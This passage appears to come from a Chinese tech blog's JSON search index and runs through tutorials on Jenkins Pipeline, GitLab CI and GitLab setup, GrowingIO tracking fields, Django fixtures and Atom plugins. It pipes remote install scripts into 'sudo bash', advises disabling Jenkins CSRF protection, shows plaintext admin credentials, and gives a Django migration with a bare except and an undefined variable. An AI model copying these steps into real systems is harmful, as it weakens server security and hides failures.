执行代码。\n2.2 远程调用 Jenkins 执行 Pipeline 如果需要在 Atom 中利用远程 Jenkins 服务器执行 Groovy 的 pipeline 脚本，需要进行如下配置：\n安装 NPM 包 - jenkins-pipeline 1 2 npm install -g jenkins-pipeline apm install build jenkins-pipeline 用于通过命令执行 Pipeline，build 是 Atom 提供的脚本执行插件，支持通过 .atom-build.yml 文件配置执行参数。\n关闭 Jenkins 的 CSRF 如果不关闭 CSRF 跨域验证，在使用命令行调用 Jenkins 时，会提示：【No valid crumb was included in request for /job/MyTest//config.xml. Returning 403】\n打开 Jenkins 的【 Manage Jenkins】-【Configure Global Security】页面，去掉 【CSRF、防止跨站点请求伪造】选项，然后保存。\n控制台 Console 调用 使用命令行调用 shell 格式：\n1 jenkins-pipeline --file \u0026lt;path to groovy file\u0026gt; --url \u0026lt;path-to-pipeline-job\u0026gt; --credentials \u0026lt;jenkins-username\u0026gt;:\u0026lt;jenkins-password\u0026gt; 在下面的例子中，使用的命令是：\n1 jenkins-pipeline --file test.groovy --url http://localhost:8080/job/MyTest/ --credentials admin:123456 可以看到脚本 test.groovy 能够被执行，同时在 Jenkins 的后台界面中，也可以看到构建的执行详情，而 MyTest 项目中 pipeline 脚本内容已经被更新为 test.groovy 的内容。\nAtom 安装 Build 插件后，配置.atom-build.yml，新增如下内容： 1 2 3 4 5 6 cmd: \u0026#34;jenkins-pipeline\u0026#34; args: - \u0026#34;--file {FILE_ACTIVE}\u0026#34; - \u0026#34;--url http://yourdomain.com:8080/job/MyTest/\u0026#34; - \u0026#34;--credentials admin:123456\u0026#34; sh: true 快捷键：F9，执行 Groovy 的 pipeline 脚本。这里的 your-project-pipeline 是项目名称。\n2.3 基本语法 注释 和 Java 一样，Groovy 使用//做单行注释，/* */做区间注释。\n定义变量 groovy 中没有固定的类型，有点类似于弱类型的语言，变量可以通过 def 关键字引用。\n1 2 def name = \u0026#39;Glan\u0026#39; def hello = \u0026#34;Hello, $name\u0026#34; 单引号表示这个字符串只是单纯的字符串；而双引号则可以在字符中引用变量,进行插值操作。\n定义方法 Grooovy 的方法也是通过 def 关键字进行定义。如果不指定返回值，默认返回最后一行代码的值。\ndef square(def num){ num*num } 闭包 闭包， 是一种数据类型，它代表了一段可执行的代码，是 Grooovy 中一个非常重要的数据类型或者说一种概念。外型如下:\n1 2 3 4 5 6 7 8 def aClosure = { param1, param2 -\u0026gt; //箭头前边标识参数，后面是代码 println \u0026#34;param2 is $param1，param2 is $param2\u0026#34; //这是代码，最后一句是返回值 //也可以使用 return 进行返回，类似于 Groovy 函数 } //调用 aClosure.call(\u0026#34;hello\u0026#34;, 100) 或者 aClosure(\u0026#34;hello\u0026#34;, 100) 调用闭包: 闭包对象.call(参数) 或者更像函数的调用方法 : 闭包对象(参数)。\n如果闭包没定义参数的话，则隐含有一个参数，这个参数名字叫 it ，和 this 的作用类似。it 代表闭包的参数。\n例如:\n1 2 3 def greeting = {\u0026#34;hello, $it\u0026#34;} //等同与 def greeting = { it -\u0026gt; \u0026#34;hello, $it\u0026#34;} 3. Jenkins 中使用 pipeline Jenkins 2.0 的精髓是 pipeline，是帮助 Jenkins 实现 CI 到 CD 转变的重要角色。Jenkins定了很多内置的环境变量，查看地址： yourdomain.com:8080/pipeline-syntax/globals#env。\n3.1 Pipeline 特点 Jenkins 中 pipeline 的设计理念是实现基于groovy脚本，灵活、可扩展的工作流。 具有如下特点：\n持久性：在 Jenkins 的 master 按计划和非计划的重启后，pipeline 的 job 仍然能够工作，不受影响。 可暂停性：pipeline 基于 groovy 可以实现 job 的暂停和等待用户的输入或批准然后继续执行。 灵活的并行执行，更强的依赖控制：通过 groovy 脚本可以实现 step、stage 间的并行执行和更复杂的相互依赖关系。 可扩展性：通过 groovy 的编程更容易扩展插件。 3.2 安装 Pipeline 进入 Jenkins 的【Manage Jenkins】-【Manage Plugins】页面，在【Available】标签下，搜索 pipeline。勾选安装，重启后生效。\n3.3 创建 Pipeline 在 Jenkins 操作页面，新建 Pipeline 项目\n在 Pipeline 中输入脚本，后保存。\n这里 Jenkins 提供了一份非常友好的功能，【Pipeline Syntax】用于生成符合要求的 pipeline 脚本片段。点击项目页面，左侧 【Pipeline Syntax】按钮。\n在【Steps】中，选中步骤，安装提示输入相关信息，Jenkins 会自动生成选中步骤的代码 Snippet 脚本。\n点击 【Build Now】，启动流水线执行。Jenkins 提供的【Full Stage View】可以查看执行的视图。\n点击某次构建，比如这里的 【#10】，可以查看到 pipeline 每个 step 的执行情况。\n如果安装了插件【Blue Ocean】，在项目的上方会出现一个提示【Open Blue Ocean】。点击进入：\n这里可以查看 pipeline 的执行情况、可视化的编辑。BlueOcean 是 Jenkins 提供的，在执行任务时，用于降低工作流程复杂度、提升工作流程清晰度的 UI 工具。\n4. pipeline 语法 4.1 关键字 下面是部分主要使用的一些关键字，pipeline 中能使用的关键字与 Jenkins 安装的插件相关。比如，安装了支持 Docker 的插件，在 pipeline 中就可以使用 withDockerContainer 等关键字。\n[archive, bat, build, catchError, checkout, deleteDir, dir, dockerFingerprintFrom, dockerFingerprintRun, echo, envVarsForTool, error, fileExists, getContext, git, githubNotify, input, isUnix, library, libraryResource, load, mail, milestone, node, parallel, properties, pwd, readFile, readTrusted, resolveScm, retry, script, sh, sleep, stage, stash, step, svn, timeout, tool, unarchive, unstash, waitUntil, withContext, withCredentials, withDockerContainer, withDockerRegistry, withDockerServer, withEnv, wrap, writeFile, ws] or symbols [all, allOf, always, any, anyOf, apiToken, architecture, archiveArtifacts, artifactManager, batchFile, booleanParam, branch, buildButton, buildDiscarder, caseInsensitive, caseSensitive, certificate, choice, choiceParam, clock, cloud, command, configFile, credentials, cron, crumb, defaultView, demand, disableConcurrentBuilds, docker, dockerCert, dockerfile, downloadSettings, downstream, dumb, envVars, environment, expression, file, fileParam, filePath, fingerprint, installSource, jdk, jdkInstaller, jgit, jgitapache, jnlp, jobName, junit, lastSuccess, list, local, location, parameters, password, pattern, pipeline-model, pipelineTriggers, plainText, plugin, pollSCM, projectNamingStrategy, proxy, upstream, usernameColonPassword, usernamePassword, viewsTabBar, weather, withAnt, zfs, zip] or globals [currentBuild, docker, env, params, pipeline, scm]\n4.2 结构 stage 顺序执行 node(\u0026#34;master\u0026#34;){ stage \u0026#39;one\u0026#39; echo \u0026#34;start one\u0026#34; sleep 1 stage \u0026#39;two\u0026#39; echo \u0026#34;start two\u0026#34; sleep 3 stage \u0026#39;three\u0026#39; echo \u0026#34;start three\u0026#34; sleep 5 } 执行结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 Started by user anonymous [Pipeline] node Running on master in /data/jenkins_home/workspace/MyTest [Pipeline] { [Pipeline] stage (one) Using the ‘stage’ step without a block argument is deprecated Entering stage one Proceeding [Pipeline] echo start one [Pipeline] sleep Sleeping for 1 秒 [Pipeline] stage (two) Using the ‘stage’ step without a block argument is deprecated Entering stage two Proceeding [Pipeline] echo start two [Pipeline] sleep Sleeping for 3 秒 [Pipeline] stage (three) Using the ‘stage’ step without a block argument is deprecated Entering stage three Proceeding [Pipeline] echo start three [Pipeline] sleep Sleeping for 5 秒 [Pipeline] } [Pipeline] // node [Pipeline] End of Pipeline Finished: SUCCESS stage 中并行结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 stage \u0026#39;parallel-testing\u0026#39; node(\u0026#34;master\u0026#34;){ parallel \u0026#39;check one\u0026#39;: { echo \u0026#34;start one\u0026#34; sleep 1 echo \u0026#34;finish one\u0026#34; }, \u0026#39;check two\u0026#39;: { echo \u0026#34;start two\u0026#34; sleep 2 echo \u0026#34;finish two\u0026#34; }, \u0026#39;check three\u0026#39;: { echo \u0026#34;start three\u0026#34; sleep 3 echo \u0026#34;finish three\u0026#34; } } 执行结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 Started by user anonymous [Pipeline] stage (parallel-testing) Using the ‘stage’ step without a block argument is deprecated Entering stage parallel-testing Proceeding [Pipeline] node Running on master in /data/jenkins_home/workspace/MyTest [Pipeline] { [Pipeline] parallel [Pipeline] [check one] { (Branch: check one) [Pipeline] [check two] { (Branch: check two) [Pipeline] [check three] { (Branch: check three) [Pipeline] [check one] echo [check one] start one [Pipeline] [check one] sleep [check one] Sleeping for 1 秒 [Pipeline] [check two] echo [check two] start two [Pipeline] [check two] sleep [check two] Sleeping for 2 秒 [Pipeline] [check three] echo [check three] start three [Pipeline] [check three] sleep [check three] Sleeping for 3 秒 [Pipeline] [check one] echo [check one] finish one [Pipeline] [check one] } [Pipeline] [check two] echo [check two] finish two [Pipeline] [check two] } [Pipeline] [check three] echo [check three] finish three [Pipeline] [check three] } [Pipeline] // parallel [Pipeline] } [Pipeline] // node [Pipeline] End of Pipeline Finished: SUCCESS 5. 实践建议 通过 groovy 脚本实现 pipeline 通过 groovy 实现的 pipeline 流程，可以将对应的 groovy 脚本存储在 Jenkinsfile 文件中，与源代码一起进行版本控制。最好在 groovy 脚本 Jenkinsfile 的第一行增加 #!groovy， 使得编辑工具能够支持 groovy 的语法高亮\n尽可能在 stage 中实现所有的任务 pipeline 里面非配置的任务，尽量都放在 stage 块里面。通过 pipeline view 插件，可以使得 pipeline 的StageView 和 monitor 更加的清楚。\n所有资源消耗的操作都应该放到node上执行 Jenkinsfile 里面的脚本，默认在 Jenkins master 上执行，这样会影响到 master 的服务。所以任何消耗资源的操作，都应该放在 node 中被分布到 agent 上执行。\n尽可能地使用parallel来使得任务并行地执行 尽量使用并行任务，这样整个 job 的流程会更加快速地完成。更佳的是，并行任务在不同的 node 上执行。\n不要在 node 里使用 input 使用 input 将暂停 pipeline 的执行，等待用户的操作。同时，如果在 node 中的 input 将使得 node 本身和 workspace 被 lock，不能够被其他 job 使用。input 应该被封装在 timeout 中。\n使用 withEnv 来修改环境变量 不建议使用 env 来修改全局的环境变量，这样之后的脚本也会受到影响。使用 withEnv 来修改环境变量，仅在 withEnv 的块里面起作用。\n使用 stash 来实现 stage/node 间共享文件，不要使用 archive archive 用来实现持久的文件存储，stash 用于 stage/node 之间共享代码。\n6. 参考 https://www.ibm.com/developerworks/cn/education/java/j-groovy/j-groovy.html http://www.ciandcd.com/?p=164 http://glanwang.com/2017/02/13/Gradle/Groovy%E8%AF%AD%E6%B3%95%E7%AE%80%E4%BB%8B/ ","description":"","id":510,"section":"post","tags":["博文","持续集成","DevOps","CICD","调试"],"title":"Jenkins Pipeline 使用及调试","uri":"https://www.chenshaowen.com/blog/jenkins-pipeline-usging-and-debug.html"},{"content":"1. 基本概念 GitLab-CI：GitLab 提供的持续集成系统，管理项目的构建状态，通过 GitLab Runner 来执行构建任务。 GitLab-Runner：用于执行构建任务，.gitlab-ci.yml 的 script 部分的运行就是由 GitLab-Runner 来完成。 .gitlab-ci.yml：在git项目的根目录下的一个文件，记录了一系列的阶段和执行规则。GitLab-CI 在 git push 后会解析它，根据里面的内容调用 GitLab-Runner 来执行。 Pipeline：一次 Pipeline 相当于一次构建任务，里面可以包含多个流程，比如安装依赖、运行测试、编译、部署测试服务器、部署生产服务器等流程。 Stages：构建阶段，在一次 Pipeline 中可以定义多个 Stages，所有 Stages 会按照顺序运行，如果任何一个 Stage 失败，那么后面的 Stages 不会执行。 Jobs：构建任务，每个 Stage 里面执行的任务。一个 Stage 可以有多个 Job ，全部 Job 会并行执行。 2. 安装 GitLab-Runner 以 Ubuntu 为例：\n1 2 curl -L https://packages.gitlab.com/install/repositories/runner/gitlab-ci-multi-runner/script.deb.sh | sudo bash apt-get install gitlab-ci-multi-runner 3. 注册 Runner Runner 需要注册到 GitLab 才可以被项目使用，一个 gitlab-ci-multi-runner 服务可以注册多个 Runner。\n1 gitlab-ci-multi-runner register 此时，需要输入一系列 Runner 的相关参数。\n1 2 3 4 5 6 7 8 9 10 Please enter the gitlab-ci coordinator URL (e.g. https://gitlab.com/): \u0026gt; http://yourdomain.com/ci # 输入 gitlab-ci 的 URL 地址，这里配置为 GitLab 地址 的 `/ci` 路径。 Please enter the gitlab-ci token for this runner: \u0026gt; XXXXXXXXX # 在【admin area】 页面的 【Overview】- 【Runners】中，可以找到这里需要的 token Please enter the gitlab-ci description for this runner: \u0026gt; shell-runner # 这里可以随便输入 Whether to lock Runner to current project [true/false]: \u0026gt; false Please enter the executor: docker, parallels, shell, kubernetes, docker-ssh, ssh, virtualbox, docker+machine, docker-ssh+machine: \u0026gt; shell #如果主要通过命令，执行构建，那么选 shell 查看 Runner 的状态\n1 gitlab-ci-multi-runner list 此时，GitLab 的项目并不能使用新建的 Runner，\n在【admin area】 页面的 【Overview】- 【Runners】\n点击编辑，将新建的 Runner 授权 【enable】给项目使用。\n4. .gitlab-ci.yml 项目的文件结构：\n在项目的一级目录下，新建 .gitlab-ci.yml文件，GitLab-CI 指定的文件名。内容如下：\n.gitlab-ci.yml\n1 2 3 4 5 6 7 8 9 stages: - build job_name: stage: build script: - cd my-app - echo \u0026#34;start build\u0026#34; - mvn package 主要是两条命令:\ncd 命令，进入 pom.xml 所在目录 mvn 命令，打包项目。 .gitlab-ci.yml 文件保存的是构建过程，采用 YAML 格式，语法规则在文末参考链接中有，构建关键字如下：\n关键词 必需 描述 image no 使用docker image services no 使用docker services stages no 定义builds阶段 before_script no 定义每个job之前执行的脚本 after_script no 定义每个job之后执行的脚本 variables no 定义build变量 cache no 定义与后续job之间应缓存的文件 5. 执行构建 向 GitLab 提交代码之后，自动执行构建任务。\n在项目的 【Pipeline】-【Jobs】选项卡下，可以看到执行情况列表。\n在项目的 【Pipeline】-【Jobs】选项卡下，点击【Staus】栏下的颜色按钮【passed】、【failed】、【canceled】按钮，可以看到执行的 Console 输出详情。\n在详情的最后，可以看到，最终在 target 目录下生成了一个 my-app-1.0-SNAPSHOT.jar 可执行的 Java 文件。\n6. 参考 https://gitlab.com/gitlab-org/gitlab-ci-multi-runner https://docs.gitlab.com/ee/ci/yaml/README.html https://segmentfault.com/a/1190000006120164 ","description":"","id":511,"section":"post","tags":["博文","DevOps","工具","持续集成","GitLab"],"title":"GitLab CI 持续集成","uri":"https://www.chenshaowen.com/blog/ci-practice-of-using-gitlab.html"},{"content":"1. 简介 GitLab 是一个利用 Ruby on Rails 开发的开源应用程序，实现了自托管的 Git 项目仓库，可通过 Web 界面进行访问公开的或者私人项目。\n它拥有与 GitHub 类似的功能，能够浏览源代码，管理缺陷和注释。可以管理团队对仓库的访问，它非常易于浏览提交过的版本并提供一个文件历史库。团队成员可以利用内置的简单聊天程序（Wall）进行交流。它还提供一个代码片段收集功能可以轻松实现代码复用，便于日后有需要的时候进行查找。\n简单说，GitLab 能够满足的需求有：\n代码仓库管理 Code Review 免费的私有仓库 开源，可以在内网搭建 GitLab CI，可以用于持续集成 2. 安装 2.1 安装工具集 1 apt-get install curl openssh-server ca-certificates postfix 2.2 安装 Gitlab CE 1 2 curl -sS https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.deb.sh | sudo bash apt-get install gitlab-ce 2.3 gitlab.rb 配置 编辑 /etc/gitlab/gitlab.rb\n将 external_url = \u0026ldquo;http://gitlab.com\u0026rdquo; ，修改为自己的域名：http://yourdomain.com。 修改端口，取消 # unicorn[\u0026lsquo;port\u0026rsquo;] = 8080 的注释，将 8080 修改为 8001 ，避免端口被占用。 修改端口，取消 # gitlab_workhorse[\u0026lsquo;auth_backend\u0026rsquo;] = \u0026ldquo;http://localhost:8080\u0026rdquo; 的注释，将 8080 修改为 8001。 关闭 GitLab 自带的 Nginx，取消 #nginx[\u0026rsquo;enable\u0026rsquo;] = true 的注释，将 true 改为 false。 2.4 本地 Nginx 配置： 下面以 GitLab 9.4.4 为例，其他版本的 gitlab.socket 位置可能不一样。可以通过命令查找具体位置：\n1 find /var -name gitlab.socket 利用，nginx -t，命令找到 nginx 的配置文件位置，新增如下server\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 upstream gitlab { server unix://var/opt/gitlab/gitlab-rails/sockets/gitlab.socket; } server{ listen 80; server_name yourdomain.com; server_tokens off; # don\u0026#39;t show the version number, a security best practice root /opt/gitlab/embedded/service/gitlab-rails/public; client_max_body_size 50m; access_log /var/log/gitlab/nginx/gitlab_access.log; error_log /var/log/gitlab/nginx/gitlab_error.log; location / { try_files $uri $uri/index.html $uri.html @gitlab; } location @gitlab { proxy_read_timeout 300; # Some requests take more than 30 seconds. proxy_connect_timeout 300; # Some requests take more than 30 seconds. proxy_redirect off; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Frame-Options SAMEORIGIN; proxy_pass http://gitlab; } location ~ ^/(assets)/ { root /opt/gitlab/embedded/service/gitlab-rails/public; # gzip_static on; # to serve pre-gzipped version expires max; add_header Cache-Control public; } error_page 502 /502.html; } 2.5 启动 GitLab 1 2 3 #启动服务 gitlab-ctl reconfigure gitlab-ctl start 其他常用命令：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 单独起一个服务 gitlab-ctl start nginx #停止服务 gitlab-ctl stop #重启服务 gitlab-ctl restart //状态 gitlab-ctl status # 查看日志 gitlab-ctl tail # 列出全部服务 gitlab-ctl service-list # 平稳停止一个服务 gitlab-ctl graceful-kill 3. 错误处理 3.1 git clone 500 这时需要修改 Nginx 配置，上面的配置使用的是 gitlab ，实际上官网上配置的是 gitlab-workhorse 。下面是一个简约配置，更详细的参数可以前往官方文档查看，文末有链接。\nupstream gitlab-workhorse { server unix://var/opt/gitlab/gitlab-workhorse/socket; } server{ listen 80; server_name yourdomain.com; server_tokens off; # don\u0026#39;t show the version number, a security best practice root /opt/gitlab/embedded/service/gitlab-rails/public; client_max_body_size 50m; access_log /var/log/gitlab/nginx/gitlab_access.log; error_log /var/log/gitlab/nginx/gitlab_error.log; location / { try_files $uri $uri/index.html $uri.html @gitlab-workhorse; } location @gitlab-workhorse { proxy_read_timeout 300; # Some requests take more than 30 seconds. proxy_connect_timeout 300; # Some requests take more than 30 seconds. proxy_redirect off; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Frame-Options SAMEORIGIN; proxy_pass http://gitlab-workhorse; } location ~ ^/(assets)/ { root /opt/gitlab/embedded/service/gitlab-rails/public; # gzip_static on; # to serve pre-gzipped version expires max; add_header Cache-Control public; } error_page 502 /502.html; } 3.2 502 页面 提示，GitLab is taking too much time to respond。这时，可以查看一下上面 Nginx 配置的 /var/log/gitlab/nginx/gitlab_error.log 日志。\n1 2017/08/12 09:35:11 [crit] 21178#0: *1568 connect() to unix://var/opt/gitlab/gitlab-workhorse/socket failed (13: Permission denied) while connecting to upstream, client: 113.92.157.150, server: yourdomain.com, request: \u0026#34;GET / HTTP/1.1\u0026#34;, upstream: \u0026#34;http://unix://var/opt/gitlab/gitlab-workhorse/socket:/\u0026#34;, host: \u0026#34;yourdomain.com\u0026#34; 接着，查看一下，/var/opt/gitlab/gitlab-workhorse/socket 的权限。\n1 2 ll /var/opt/gitlab/gitlab-workhorse/socket \u0026gt; srwxrwxrwx 1 git git 0 Aug 12 11:15 /var/opt/gitlab/gitlab-workhorse/socket= 再看 nignx.conf 中\n1 user nginx; 分析原因：网页以 nginx 用户执行 /var/opt/gitlab/gitlab-workhorse/socket 失败，没有权限。而 /var/opt/gitlab/gitlab-workhorse/socket 所属 git 组，git 用户。所以，只需要将 nginx 用户加入 git 组，即可。\n1 usermod -G git nginx 官方文档上是通过，passenger_group 实现的，由于 Passenger 模块需要重新编译 Nginx 安装，于是，没有采用官方文档的配置。Stackoverflow 上面，有人通过直接修改 /var/opt/gitlab/gitlab-workhorse/socket 所属组也可以，没有复现出来，并且，每次 gitlab-ctl reconfigure 之后，修改的权限就会失效。\n4，测试 具体的 git 命令，这里就不详细罗列了。新建一个项目，GitLab 支持直接从 GitHub 上 Fork，接着 git clone 到本地，然后 git push 到 master，进行了一个完整的推拉过程。\n5. 参考 https://zh.wikipedia.org/wiki/Gitlab https://docs.gitlab.com/omnibus/settings/nginx.html ","description":"","id":512,"section":"post","tags":["博文","Demo","工具","管理","持续集成","GitLab","DevOps"],"title":"GitLab 搭建与配置","uri":"https://www.chenshaowen.com/blog/build-and-configure-of-gitlab.html"},{"content":"1. 字段含义 1.1 u， 用户ID 1 2 3 4 5 6 if cookie.has(gr_user_id){ //使用 cookie 中的 gr_user_id 有效期十年 } else { //按照 \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\u0026#34; 格式，随机生成一个 gr_user_id } 1.2 s，会话ID 1 2 3 4 5 6 7 if cookie.has(gr_session_id_){ //使用 cookie 中的 gr_session_id_ //gr_session_id_，的有效期为 100 分钟 } else { //按照 \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\u0026#34; 格式，随机生成一个 gr_session_id_ } 1.3 t，事件类型 imp，显示 vst，访问 clck，点击 chng，变更 sbmt，提交 1.4 tm，当前时间 1 +Date.now() 数据发出时，浏览器当前时间。\n1.5 ptm，页面加载时间 1 +Date.now() 当前页面加载时，浏览器当前时间。跳转或刷新时，刷新。\n1.6 d，当前域名 1 window.location.host 1.7 p，当前相对路径 去掉域名和参数部分的 URI，不包含 ？ 的内容\n1.8 rf， 访问来源 1 document.referrer 1.9 sh，屏幕高度 1 window.screen.height 1.10 sw，屏幕宽度 1 window.screen.width 1.11 l，浏览器语言 1 zh-cn 1.12 e，触发的事件 e.x ，xpath e.h，href e.v，元素文本内容 2. 原理简介 原始的 http://dn-growing.qbox.me/vds-gate.js ，采集的数据并不可读。这是因为在发送采集数据之前，vds-gate.js 对数据进行了编码。阅读代码之前，必须先去掉编码处理。\nMutationObserver：Mutation Observer（变动观察器）是监视DOM变动的接口。当DOM对象树发生任何变动时，Mutation Observer会得到通知。\n事件主要分为两类：\nDOM变更：GrowingIO 采集 JS 中引入了 Google 实现的 MutationObserver 封装。提供对 DOM 变动时，数据的采集。 行为触发：主要是页面的 visit、impression、click、submit等。 首次访问时，API 返回应用和用户设备相关的信息，产生 visit 和 页面加载时 DOM 变化的 Event 事件流数据。会有两次数据采集：\n第一次，采集设备相关的信息。客户端、屏幕大小、语言等。 第二次，采集页面加载时，DOM 变化的事件流。 在不刷新页面的前提下，当前页面每次 DOM 发生变化，每次点击等行为，都会有数据的提交。\n点击等行为、数据采集的格式\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [ { \u0026#34;u\u0026#34;: \u0026#34;7ddbc39e-8861-482d-bba6-b9e00f4607e7\u0026#34;, \u0026#34;s\u0026#34;: \u0026#34;da237b25-6a7f-4e37-beba-5d1e7255ff88\u0026#34;, \u0026#34;t\u0026#34;: \u0026#34;clck\u0026#34;, \u0026#34;tm\u0026#34;: 1502335934576, \u0026#34;ptm\u0026#34;: 1502335904058, \u0026#34;d\u0026#34;: \u0026#34;domain.com\u0026#34;, \u0026#34;p\u0026#34;: \u0026#34;/overview\u0026#34;, \u0026#34;e\u0026#34;: [ { \u0026#34;v\u0026#34;: \u0026#34;2016\u0026#34;, \u0026#34;x\u0026#34;: \u0026#34;/div#wrapper/div#page-wrapper.page-wrapper/div.content\u0026#34; } ] } ] 3. 参考 https://developer.mozilla.org/zh-CN/docs/Web/API/MutationObserver https://github.com/google/eme_logger/blob/master/mutation-summary.js ","description":"","id":513,"section":"post","tags":["博文","数据","前端","分析"],"title":"GrowingIO 数据采集字段分析","uri":"https://www.chenshaowen.com/blog/growingio-collect-js-field-analysis.html"},{"content":"1. Fixtures 特点 Fixtures 是一种新的提供初始化数据的方法，并且被 Django 的测试框架用来处理单元测试的测试数据。不同于 SQL 文件的是，使用 fixture 可以提供一个被 Django 的 serialization 系统所能识别的序列化文件，它会被读取并自动转换成对应的 model ，然后保存进数据库。\n2. 数据导出 将 app_name 的数据导出为 initial_data.json。\n1 python manage.py dumpdata app_name \u0026gt; initial_data.json 3. 数据导入 导入方式有两种，一种是执行 loaddata 命令，另外一种是通过 migrations 文件，变更数据库时，插入数据。\n3.1 loaddata 导入数据 将数据储存在应用的 fixtures 目录中，然后执行导入命令：\n1 2 python manage.py loaddata app_name/fixtures/initial_data.json \u0026gt; Installed 1 object(s) from 1 fixture(s) 由于，在 initial_data.json 已经指明了 model ，这里不需要其他参数就能按照预期导入数据。需要注意的是，由于 dumpdata 导出的文件中有 pk ，如果数据库中已经存在该 pk，数据不会被再次导入。\n3.2 Python Migration 导入数据 在 Django 的 settings.py 文件中，新增\n1 2 3 4 import os PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__)) PROJECT_DIR, PROJECT_MODULE_NAME = os.path.split(PROJECT_ROOT) FIXTURE_FILE = os.path.join(PROJECT_DIR, PROJECT_MODULE_NAME, \u0026#39;app_name/fixtures/initial_data.json\u0026#39;) 指明初始化数据的文件目录。\n使用 python manage.py makemigrations --empty app_name 命令，在 app_name 的 migrations 目录下创建一个空的 Python 文件。内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # -*- coding: utf-8 -*- from __future__ import unicode_literals import json from django.db import migrations from settings import FIXTURE_FILE from app_name.models import AppModel def forwards_func(apps, schema_editor): try: json_data = open(FIXTURE_FILE) _obj = json.load(json_data) _obj = [i[\u0026#39;fields\u0026#39;] for i in user_obj] _list = [AppModel(username=i[\u0026#39;username\u0026#39;], last_name=i[\u0026#39;last_name\u0026#39;], password=i[\u0026#39;password\u0026#39;] ) for i in _obj] if _list: AppModel.objects.bulk_create(_list) json_data.close() except: pass class Migration(migrations.Migration): dependencies = [ (\u0026#39;app_name\u0026#39;, \u0026#39;0001_initial\u0026#39;), ] operations = [ migrations.RunPython(forwards_func), ] 然后执行\n1 python manage.py migrate app_name Django Migration 提供了两个函数，用于数据的操作\nforwards_func 用来执行插入数据的操作。 reverse_func 用来执行回滚操作。 需要注意的是，这里是通过 open 一个 json 文件来获取初始化数据，还可以通过硬编码写入 Python 文件、读取 Excel、读取 TXT 等方式获取初始化数据。\n4. 适用场景 Fixtures 适用于少量的初始化数据，因为它使用 Django 的序列化功能，所以不依赖于特定的数据库。它执行起来没有SQL快，因为要创建对象。另外，这个功能可以在你切换数据库平台的时候使用，比如我要把系统从 Mysql 切换到 PostgreSQL ，就可以使用 fixtures 来导入转出数据。\n","description":"","id":514,"section":"post","tags":["博文","Django","数据","初始化"],"title":"Django 初始化数据之 fixture","uri":"https://www.chenshaowen.com/blog/django-initializes-fixture-of-data.html"},{"content":" 目前，本人使用的是 PyCharm ，作为前后端的集成开发工具。主要的技术栈有，JavaScript，CSS，ECMAScript 6，Vue，Python，Django，Mako，Markdown。近期的前端开发工作逐渐增加，PyCharm 似乎有些力不从心。Atom、Sublime Text、Visual Studio Code 成为了备选，Atom 是由 Github 维护，具有更好的社区支持，可配置性、可玩性更强，本文主要介绍如何将 Atom 配置成 Python + Vuejs 的全栈开发环境。\n1. atom-beautify 代码格式插件 代码格式插件，支持 HTML, CSS, JavaScript, PHP, Python, Ruby, Java, C, C++, C#, Objective-C, CoffeeScript, TypeScript, Coldfusion, SQL 等。\n快捷键：Ctrl + Alt + B\n1.提示：\nPlease run Atom command \u0026lsquo;Atom-Beautify: Migrate Settings\u0026rsquo;.\n解决办法：\n1.Ctrl + Shift + P\n2.执行：Atom-Beautify: Migrate Settings\n2.提示：\nCould not find \u0026lsquo;autopep8\u0026rsquo;. The program may not be installed.\n解决办法：\n1 pip install autopep8 不同的语言，可能会提示安装不同的 Python 包。比如，Shell 提示安装 beautysh。\n2. python-tools 跳转插件 同时编辑，同名文本内容。选中文本后，快捷键：Ctrl + Alt + U。\n跳转到定义处，快捷键：Ctrl + Alt + G\n选中光标所处位置的全部文本，快捷键：Ctrl + Alt + E\n3. autocomplete-python 自动补全插件 4. python-debugger 调试插件 打开快捷键：Alt + R\n设置断点：Alt + Shift + R\n5. platformio-ide-terminal 命令终端插件 打开快捷键：Ctrl+\n6. script 脚本执行插件 Script 插件支持绝大部分编程语言脚本执行，执行快捷键：Ctrl + Shift + B。\n7. emmet 生成 HTML 代码片段插件 快捷键：Ctrl + E\n8. Snippets 快速申明编码 为了统一编码格式，在新建的 Python 文件中需要申明 utf-8 编码格式。为了快速添加编码申明，这里使用了 Atom Snippets。\n在 C:\\Users\\Yourname\\.atom\\snippets.cson 文件中新增如下内容：\n1 2 3 4 \u0026#39;.source.python\u0026#39;: # 在何种文件中使用这个Snippet \u0026#39;python coding\u0026#39;: # 对Snippet的简短说明 \u0026#39;prefix\u0026#39;: \u0026#39;coding\u0026#39; # 输入什么前缀可以触发这个Snippet \u0026#39;body\u0026#39;: \u0026#39;# -*- coding: utf-8 -*-\u0026#39; # Snippet的内容 输入: coding 时，添加编码申明的内容。\n9. 不显示 .pyc 文件 一共分为两步：\nFile -\u0026gt; Settings -\u0026gt; Core 找到 Ignored Names ，新增 *.pyc File -\u0026gt; Settings -\u0026gt; Packages 查找 tree-view 进入 Settings ，勾选 Hide Ignored Names。 ","description":"","id":515,"section":"post","tags":["博文","工具","Python","研发","IDE","Atom","全栈"],"title":"Atom 打造轻量级的 Python 全栈 IDE","uri":"https://www.chenshaowen.com/blog/atom-create-lightweight-python-full-stack-ide.html"},{"content":"1. Atom 简介 Atom 是支持 Windows、Mac、Linux 三大桌面平台，完全免费，并且在 GitHub 